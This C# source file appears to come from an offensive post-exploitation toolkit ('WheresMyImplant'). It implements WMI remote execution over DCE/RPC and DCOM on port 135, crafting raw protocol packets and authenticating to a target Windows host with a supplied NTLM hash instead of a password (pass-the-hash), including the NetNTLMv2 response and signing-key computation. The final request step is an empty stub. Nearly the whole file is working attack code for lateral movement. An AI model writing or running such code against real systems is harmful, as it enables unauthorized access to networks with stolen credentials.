using System;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace WheresMyImplant
{
    class WMIExec : Base, IDisposable
    {
        private String target;

        private TcpClient wmiClientInitiator;
        private TcpClient wmiClient;
        private TcpClient randomClient;
        private NetworkStream wmiStream;

        private Byte[] recieve;
        private String hostname;

        private Byte[] sessionId;
        private Byte[] causalityId;
        private Byte[] ipid;
        private Byte[] uuid;

        private Byte[] sequenceNumber = new Byte[] { 0x00, 0x00, 0x00, 0x00 };

        private Byte[] sessionBaseKey;
        private Byte[] signingKey;

        private Byte[] assocGroup;

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal WMIExec()
        {
            wmiClientInitiator = new TcpClient();
            wmiClientInitiator.Client.ReceiveTimeout = 30000;

            wmiClient = new TcpClient();
            wmiClient.Client.ReceiveTimeout = 30000;

            recieve = new Byte[2048];
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean ConnectInitiator(String target)
        {
            this.target = target;

            Console.WriteLine("Connecting to {0}:135", target);
            try
            {
                wmiClientInitiator.Connect(target, 135);
            }
            catch (Exception ex)
            {
                WriteOutput(ex.Message);
            }

            Boolean result = wmiClientInitiator.Connected;
            Console.WriteLine(result);
            if (result)
            {
                wmiStream = wmiClientInitiator.GetStream();
                return true;
            }
            else
            {
                return false;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void InitiateRPC()
        {
            DCERPCBind rpcBind = new DCERPCBind();
            rpcBind.SetCallID(2);
            rpcBind.SetFragLength(new Byte[] { 0x74, 0x00 });
            rpcBind.SetNumCtxItems(new Byte[] { 0x02 });
            rpcBind.SetContextID(new Byte[] { 0x00, 0x00 });
            rpcBind.SetInterface(new Byte[] { 0xc4, 0xfe, 0xfc, 0x99, 0x60, 0x52, 0x1b, 0x10, 0xbb, 0xcb, 0x00, 0xaa, 0x00, 0x21, 0x34, 0x7a });
            rpcBind.SetInterfaceVer(new Byte[] { 0x00, 0x00 });
            Byte[] bRPCBind = rpcBind.GetRequest();

            wmiStream.Write(bRPCBind, 0, bRPCBind.Length);
            wmiStream.Flush();
            wmiStream.Read(recieve, 0, recieve.Length);

            assocGroup = recieve.Skip(20).Take(4).ToArray();

            DCERPCRequest rpcRequest = new DCERPCRequest();
            rpcRequest.SetPacketFlags(new Byte[] { 0x03 });
            rpcRequest.SetFragLength(0, 0, 0);
            rpcRequest.SetCallID(new Byte[] { 0x02, 0x00, 0x00, 0x00 });
            rpcRequest.SetContextID(new Byte[] { 0x00, 0x00 });
            rpcRequest.SetContextID(new Byte[] { 0x00, 0x00 });
            rpcRequest.SetOpnum(new Byte[] { 0x05, 0x00 });
            Byte[] bRPCRequest = rpcRequest.GetRequest();

            wmiStream.Write(bRPCRequest, 0, bRPCRequest.Length);
            wmiStream.Flush();
            wmiStream.Read(recieve, 0, recieve.Length);

            Byte[] bHostname = recieve.Skip(42).Take(recieve.Length - 42).ToArray();
            GCHandle handle = GCHandle.Alloc(bHostname, GCHandleType.Pinned);
            hostname = Marshal.PtrToStringUni(handle.AddrOfPinnedObject());
            Console.WriteLine("Target hostname: {0}", hostname);
            handle.Free();

            if (null != wmiStream)
            {
                wmiStream.Close();
            }

            if (null != wmiClientInitiator && wmiClientInitiator.Connected)
            {
                wmiClientInitiator.Close();
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean ConnectWMI()
        {
            Console.WriteLine("Connecting to {0}:135", target);
            try
            {
                wmiClient.Connect(target, 135);
            }
            catch (Exception ex)
            {
                WriteOutput(ex.Message);
                return false;
            }

            if (wmiClient.Connected)
            {
                wmiStream = wmiClient.GetStream();
                return true;
            }
            else
            {
                return false;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void RPCBind()
        {
            DCERPCBind rpcBind = new DCERPCBind();
            rpcBind.SetCallID(3, new Byte[] { 0x07, 0x82, 0x08, 0xa2 });
            rpcBind.SetFragLength(new Byte[] { 0x78, 0x00 });
            rpcBind.SetAuthLength(new Byte[] { 0x28, 0x00 });
            rpcBind.SetNumCtxItems(new Byte[] { 0x01 });
            rpcBind.SetContextID(new Byte[] { 0x01, 0x00 });
            rpcBind.SetInterface(new Byte[] { 0xa0, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 });
            rpcBind.SetInterfaceVer(new Byte[] { 0x00, 0x00 });
            Byte[] bRPCBind = rpcBind.GetRequest();

            wmiStream.Write(bRPCBind, 0, bRPCBind.Length);
            wmiStream.Flush();
            wmiStream.Read(recieve, 0, recieve.Length);

            assocGroup = recieve.Skip(20).Take(4).ToArray();
        }

        internal Byte[] GetNetNTLMv2Response(String domain, String username, String hash)
        {
            assocGroup = recieve.Skip(20).Take(4).ToArray();

            String NTLMSSP = BitConverter.ToString(recieve).Replace("-", "");
            Int32 index = NTLMSSP.IndexOf("4E544C4D53535000") / 2;

            UInt16 wDomain = BitConverter.ToUInt16(recieve.Skip(index + 12).Take(2).ToArray(), 0);
            UInt16 wtarget = BitConverter.ToUInt16(recieve.Skip(index + 40).Take(2).ToArray(), 0);

            sessionId = recieve.Skip(44).Take(8).ToArray();
            Byte[] bServerChallenge = recieve.Skip(index + 24).Take(8).ToArray();
            Int32 start = index + 56 + wDomain;
            Int32 end = index + 55 + wDomain + wtarget;
            Byte[] details = recieve.Skip(start).Take(end - start + 1).ToArray();
            Byte[] bTime = details.Skip(details.Length - 12).Take(8).ToArray();

            Int32 j = 0;
            Byte[] bHash = new Byte[hash.Length / 2];
            for (Int32 i = 0; i < hash.Length; i += 2)
            {
                bHash[j++] = (Byte)((Char)Convert.ToInt16(hash.Substring(i, 2), 16));
            }

            Byte[] bHostname = Encoding.Unicode.GetBytes(Environment.MachineName);
            Byte[] hostnameLength = BitConverter.GetBytes(bHostname.Length).Take(2).ToArray();

            Byte[] bDomain = Encoding.Unicode.GetBytes(domain);
            Byte[] domainLength = BitConverter.GetBytes(bDomain.Length).Take(2).ToArray();

            Byte[] bUsername = Encoding.Unicode.GetBytes(username);
            Byte[] usernameLength = BitConverter.GetBytes(bUsername.Length).Take(2).ToArray();

            Byte[] domainOffset = { 0x40, 0x00, 0x00, 0x00 };
            Byte[] usernameOffset = BitConverter.GetBytes(bDomain.Length + 64);
            Byte[] hostnameOffset = BitConverter.GetBytes(bDomain.Length + bUsername.Length + 64);
            Byte[] lmOffset = BitConverter.GetBytes(bDomain.Length + bUsername.Length + bHostname.Length + 64);
            Byte[] ntOffset = BitConverter.GetBytes(bDomain.Length + bUsername.Length + bHostname.Length + 88);

            String usernameTarget = username.ToUpper();
            Byte[] bUsernameTarget = Encoding.Unicode.GetBytes(usernameTarget);
            bUsernameTarget = Misc.Combine(bUsernameTarget, bDomain);

            Byte[] NetNTLMv2Hash;
            using (HMACMD5 hmac = new HMACMD5())
            {
                hmac.Key = bHash;
                NetNTLMv2Hash = hmac.ComputeHash(bUsernameTarget);
            }

            Byte[] bClientChallenge = new Byte[8];
            Random random = new Random();
            for (Int32 i = 0; i < 8; i++)
            {
                bClientChallenge[i] = (Byte)random.Next(0, 255);
            }

            Byte[] blob = Misc.Combine(new Byte[] { 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }, bTime);
            blob = Misc.Combine(blob, bClientChallenge);
            blob = Misc.Combine(blob, new Byte[] { 0x00, 0x00, 0x00, 0x00 });
            blob = Misc.Combine(blob, details);
            blob = Misc.Combine(blob, new Byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });

            Byte[] NetNTLMv2Response;
            using (HMACMD5 hmacMD5 = new HMACMD5())
            {
                hmacMD5.Key = NetNTLMv2Hash;
                Byte[] bServerChallengeAndBlob = Misc.Combine(bServerChallenge, blob);
                NetNTLMv2Response = hmacMD5.ComputeHash(bServerChallengeAndBlob);
                sessionBaseKey = hmacMD5.ComputeHash(NetNTLMv2Response);
            }

            Byte[] signingConstant = { 0x73,0x65,0x73,0x73,0x69,0x6f,0x6e,0x20,0x6b,0x65,0x79,0x20,0x74,0x6f,0x20,
                                       0x63,0x6c,0x69,0x65,0x6e,0x74,0x2d,0x74,0x6f,0x2d,0x73,0x65,0x72,0x76,
                                       0x65,0x72,0x20,0x73,0x69,0x67,0x6e,0x69,0x6e,0x67,0x20,0x6b,0x65,0x79,
                                       0x20,0x6d,0x61,0x67,0x69,0x63,0x20,0x63,0x6f,0x6e,0x73,0x74,0x61,0x6e,
                                       0x74,0x00 };

            using (MD5 md5 = new MD5CryptoServiceProvider())
            {
                signingKey = md5.ComputeHash(Misc.Combine(sessionBaseKey, signingConstant));
            }

            NetNTLMv2Response = Misc.Combine(NetNTLMv2Response, blob);
            Byte[] NetNTLMv2ResponseLength = BitConverter.GetBytes(NetNTLMv2Response.Length).Take(2).ToArray();

            Byte[] sessionKeyOffset = BitConverter.GetBytes(bDomain.Length + bUsername.Length + bHostname.Length + NetNTLMv2Response.Length + 88);

            Combine combine = new Combine();
            combine.Extend(new Byte[] { 0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00, 0x03, 0x00, 0x00, 0x00 });
            combine.Extend(new Byte[] { 0x18, 0x00 });
            combine.Extend(new Byte[] { 0x18, 0x00 });
            combine.Extend(lmOffset);

            combine.Extend(NetNTLMv2ResponseLength);
            combine.Extend(NetNTLMv2ResponseLength);
            combine.Extend(ntOffset);

            combine.Extend(domainLength);
            combine.Extend(domainLength);
            combine.Extend(domainOffset);

            combine.Extend(usernameLength);
            combine.Extend(usernameLength);
            combine.Extend(usernameOffset);

            combine.Extend(hostnameLength);
            combine.Extend(hostnameLength);
            combine.Extend(hostnameOffset);

            combine.Extend(new Byte[] { 0x00, 0x00 });
            combine.Extend(new Byte[] { 0x00, 0x00 });
            combine.Extend(sessionKeyOffset);

            combine.Extend(new Byte[] { 0x15, 0x82, 0x88, 0xa2 });
            combine.Extend(bDomain);
            combine.Extend(bUsername);
            combine.Extend(bHostname);
            combine.Extend(new Byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
            combine.Extend(NetNTLMv2Response);
            return combine.Retrieve();
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void Authenticate(String domain, String username, String hash)
        {
            Byte[] NetNTLMv2Response = GetNetNTLMv2Response(domain, username, hash);

            DCERPCAUTH3 rpcAUTH3 = new DCERPCAUTH3();
            rpcAUTH3.SetNTLMSSP(NetNTLMv2Response);
            Byte[] bRPCAUTH3 = rpcAUTH3.GetRequest();

            wmiStream.Write(bRPCAUTH3, 0, bRPCAUTH3.Length);
            wmiStream.Flush();
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean Activator()
        {
            causalityId = Encoding.ASCII.GetBytes(Misc.GenerateUuid(16));

            DCOMRemoteCreateInstance remoteCreateInstance = new DCOMRemoteCreateInstance();
            remoteCreateInstance.SetDCOMCausalityID(causalityId);
            remoteCreateInstance.SetServerInfoName(hostname);
            Byte[] bRemoteCreateInstance = remoteCreateInstance.GetRequest();

            DCERPCRequest rpcRequest = new DCERPCRequest();
            rpcRequest.SetPacketFlags(new Byte[] { 0x03 });
            rpcRequest.SetFragLength(bRemoteCreateInstance.Length, 0, 0);
            rpcRequest.SetCallID(new Byte[] { 0x03, 0x00, 0x00, 0x00 });
            rpcRequest.SetContextID(new Byte[] { 0x01, 0x00 });
            rpcRequest.SetOpnum(new Byte[] { 0x04, 0x00 });

            Byte[] bData = Misc.Combine(rpcRequest.GetRequest(), bRemoteCreateInstance);
            wmiStream.Write(bData, 0, bData.Length);
            wmiStream.Flush();
            wmiStream.Read(recieve, 0, recieve.Length);

            if (null != wmiStream)
            {
                wmiStream.Close();
            }

            if (null != wmiClient && wmiClient.Connected)
            {
                wmiClient.Close();
            }

            if (recieve.Skip(2).Take(1).ToArray().SequenceEqual(new Byte[] { 0x02 }))
            {
                Console.WriteLine("WMI Access");
                return true;
            }
            else
            {
                Console.WriteLine(BitConverter.ToString(recieve.Skip(4).Take(4).ToArray()));
                return false;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal Boolean ConnectRandom()
        {
            Byte[] bTargetUnicode = Misc.Combine(new Byte[] { 0x07, 0x00 }, Encoding.Unicode.GetBytes(hostname + "["));
            String search = BitConverter.ToString(bTargetUnicode).Replace("-", "");
            String strRecieve = BitConverter.ToString(recieve).Replace("-", "");
            Int32 indexStart = strRecieve.IndexOf(search) / 2;

            indexStart = Array.IndexOf(recieve, (Byte)0x5b, indexStart) + 2;
            Int32 indexEnd = Array.IndexOf(recieve, (Byte)0x5d, indexStart);
            Byte[] bPort = new Byte[indexEnd - indexStart];
            Array.Copy(recieve, indexStart, bPort, 0, indexEnd - indexStart);
            Int32.TryParse(Encoding.Unicode.GetString(bPort), out Int32 port);
            Console.WriteLine(port);

            String MEOW = BitConverter.ToString(recieve).Replace("-", "");
            Int32 meowIndex = MEOW.IndexOf("4D454F570100000018AD09F36AD8D011A07500C04FB68820") / 2;

            String oxid = BitConverter.ToString(recieve.Skip(meowIndex + 32).Take(8).ToArray()).Replace("-", "");
            ipid = recieve.Skip(meowIndex + 48).Take(16).ToArray();

            Int32 oxidIndex2 = MEOW.IndexOf(oxid, MEOW.IndexOf(oxid) + 1) / 2;
            uuid = recieve.Skip(oxidIndex2 + 12).Take(16).ToArray();

            Console.WriteLine("Connecting to {0}:{1}", target, port);
            randomClient = new TcpClient();
            randomClient.Client.ReceiveTimeout = 30000;
            try
            {
                randomClient.Connect(target, port);
            }
            catch (Exception ex)
            {
                WriteOutput(ex.Message);
                return false;
            }

            if (randomClient.Connected)
            {
                wmiStream = randomClient.GetStream();
                return true;
            }
            else
            {
                return false;
            }           
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void RPCBindRandom()
        {
            DCERPCBind rpcBind = new DCERPCBind();
            rpcBind.SetCallID(2, new Byte[] { 0x04 }, new Byte[] { 0x97, 0x82, 0x08, 0xa2 });
            rpcBind.SetFragLength(new Byte[] { 0xd0, 0x00 });
            rpcBind.SetAuthLength(new Byte[] { 0x28, 0x00 });
            rpcBind.SetNumCtxItems(new Byte[] { 0x03 }, new Byte[] { 0x97, 0x82, 0x08, 0xa2 });
            rpcBind.SetContextID(new Byte[] { 0x00, 0x00 });
            rpcBind.SetInterface(new Byte[] { 0x43, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 });
            rpcBind.SetInterfaceVer(new Byte[] { 0x00, 0x00 });
            Byte[] bRPCBind = rpcBind.GetRequest();

            wmiStream.Write(bRPCBind, 0, bRPCBind.Length);
            wmiStream.Flush();
            wmiStream.Read(recieve, 0, recieve.Length);
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void AuthenticateRandom(String domain, String username, String hash)
        {
            Byte[] NetNTLMv2Response = GetNetNTLMv2Response(domain, username, hash);

            DCERPCAUTH3 rpcAUTH3 = new DCERPCAUTH3();
            rpcAUTH3.SetNTLMSSP(NetNTLMv2Response);
            rpcAUTH3.SetCallID(new Byte[] { 0x02, 0x00, 0x00, 0x00 });
            rpcAUTH3.SetAuthLevel(new Byte[] { 0x04 });
            Byte[] bRPCAUTH3 = rpcAUTH3.GetRequest();

            wmiStream.Write(bRPCAUTH3, 0, bRPCAUTH3.Length);
            wmiStream.Flush();
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        internal void QueryInterface()
        {
            DCERPCRequest rpcRequest = new DCERPCRequest();
            rpcRequest.SetPacketFlags(new Byte[] { 0x83 });
            rpcRequest.SetData(uuid);
            Console.WriteLine(BitConverter.ToString(uuid));
            rpcRequest.SetFragLength(76, 16, 4);
            rpcRequest.SetCallID(new Byte[] { 0x02, 0x00, 0x00, 0x00 });
            rpcRequest.SetContextID(new Byte[] { 0x00, 0x00 });
            rpcRequest.SetOpnum(new Byte[] { 0x03, 0x00 });
            Byte[] bRPCRequest = rpcRequest.GetRequest();

            DCOMRemQueryInterface remQueryInterface = new DCOMRemQueryInterface();
            remQueryInterface.SetCausalityID(causalityId);
            Console.WriteLine(BitConverter.ToString(causalityId));
            remQueryInterface.SetIPID(ipid);
            Console.WriteLine(BitConverter.ToString(ipid));
            remQueryInterface.SetIID(new Byte[] { 0xd6, 0x1c, 0x78, 0xd4, 0xd3, 0xe5, 0xdf, 0x44, 0xad, 0x94, 0x93, 0x0e, 0xfe, 0x48, 0xa8, 0x87 });
            Byte[] bRemQueryInterface = remQueryInterface.GetRequest();

            NTLMSSPVerifier verifier = new NTLMSSPVerifier();
            verifier.SetAuthPadLen(4);
            verifier.SetAuthLevel(new Byte[] { 0x04 });
            verifier.SetNTLMSSPVerifierSequenceNumber(sequenceNumber);
            Console.WriteLine(BitConverter.ToString(sequenceNumber));
            Byte[] bVerifier = verifier.GetRequest();

            Byte[] rpcSignature;
            using (HMACMD5 hmacMD5 = new HMACMD5())
            {
                hmacMD5.Key = signingKey;
                Console.WriteLine(BitConverter.ToString(signingKey));
                Combine hmacCombine = new Combine();
                hmacCombine.Extend(sequenceNumber);
                hmacCombine.Extend(bRPCRequest);
                hmacCombine.Extend(bRemQueryInterface);
                hmacCombine.Extend(bVerifier.Take(12).ToArray());

                rpcSignature = hmacMD5.ComputeHash(hmacCombine.Retrieve());
            }
            verifier.SetNTLMSSPVerifierChecksum(rpcSignature.Take(8).ToArray());
            bVerifier = verifier.GetRequest();

            Combine combine = new Combine();
            combine.Extend(bRPCRequest);
            combine.Extend(bRemQueryInterface);
            combine.Extend(bVerifier);
            Byte[] bData = combine.Retrieve();

            wmiStream.Write(bData, 0, bData.Length);
            wmiStream.Flush();
            wmiStream.Read(recieve, 0, recieve.Length);
        }

        internal void AlterContext()
        {
            Byte[] callID = new Byte[0];
            Byte[] contextID = new Byte[0];
            Byte[] contextUUID = new Byte[0];

            if(sequenceNumber.SequenceEqual(new Byte[] { 0x00, 0x00, 0x00, 0x00 }))
            {
                callID = new Byte[] { 0x03, 0x00, 0x00, 0x00 };
                contextID = new Byte[] { 0x02, 0x00 };
                contextUUID = new Byte[] { 0xd6, 0x1c, 0x78, 0xd4, 0xd3, 0xe5, 0xdf, 0x44, 0xad, 0x94, 0x93, 0x0e, 0xfe, 0x48, 0xa8, 0x87 };
            }
            else if (sequenceNumber.SequenceEqual(new Byte[] { 0x01, 0x00, 0x00, 0x00 }))
            {
                callID = new Byte[] { 0x04, 0x00, 0x00, 0x00 };
                contextID = new Byte[] { 0x03, 0x00 };
                contextUUID = new Byte[] { 0x18, 0xad, 0x09, 0xf3, 0x6a, 0xd8, 0xd0, 0x11, 0xa0, 0x75, 0x00, 0xc0, 0x4f, 0xb6, 0x88, 0x20 };
            }
            else if (sequenceNumber.SequenceEqual(new Byte[] { 0x09, 0x00, 0x00, 0x00 }))
            {
                callID = new Byte[] { 0x09, 0x00, 0x00, 0x00 };
                contextID = new Byte[] { 0x04, 0x00 };
                contextUUID = new Byte[] { 0x99, 0xdc, 0x56, 0x95, 0x8c, 0x82, 0xcf, 0x11, 0xa3, 0x7e, 0x00, 0xaa, 0x00, 0x32, 0x40, 0xc7 };
            }

            DCERPCAlterContext alterContext = new DCERPCAlterContext();
            alterContext.SetAssocGroup(assocGroup);
            alterContext.SetCallID(callID);
            alterContext.SetContextID(contextID);
            alterContext.SetInterface(contextUUID);
            Byte[] bData = alterContext.GetRequest();

            wmiStream.Write(bData, 0, bData.Length);
            wmiStream.Flush();
            wmiStream.Read(recieve, 0, recieve.Length);

            Request();
        }

        internal void Request()
        {

        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public void Dispose()
        {
            if (null != wmiStream)
            {
                wmiStream.Close();
            }

            if (null != wmiClientInitiator && wmiClientInitiator.Connected)
            {
                wmiClientInitiator.Close();
            }

            if (null != wmiClient && wmiClient.Connected)
            {
                wmiClient.Close();
            }

            if (null != randomClient && randomClient.Connected)
            {
                randomClient.Close();
            }
        }
    }
}